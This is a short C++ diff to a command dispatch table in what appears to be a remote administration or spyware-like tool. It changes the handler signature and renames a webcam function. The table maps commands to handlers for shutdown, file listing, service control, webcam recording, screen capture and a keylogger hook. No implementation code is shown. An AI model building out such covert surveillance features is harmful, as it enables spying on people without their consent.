@@ -1,7 +1,7 @@
 #include "services.h"
 
 namespace Services {
-    std::map<std::pair<std::string, std::string>, bool(*)(const std::string&)> servicesMap {
+    std::map<std::pair<std::string, std::string>, std::vector<std::string>(*)(Command)> servicesMap {
         {{"system", "shutdown"},     &shutdown}, 
         {{"system", "restart"},      &restart},
         {{"file", "list"},           &listFileAndFolder},
@@ -12,7 +12,7 @@ namespace Services {
         {{"service", "list"},        &listServices},
         {{"service", "start"},       &startService},
         {{"service", "stop"},        &stopService},
-        {{"webcam", "record"},       &webcamCapture},
+        {{"webcam", "record"},       &webcamRecord},
         {{"screen", "capture"},      &screenShot},
         {{"keylogger", "hook"},      &keyLogger}
     };
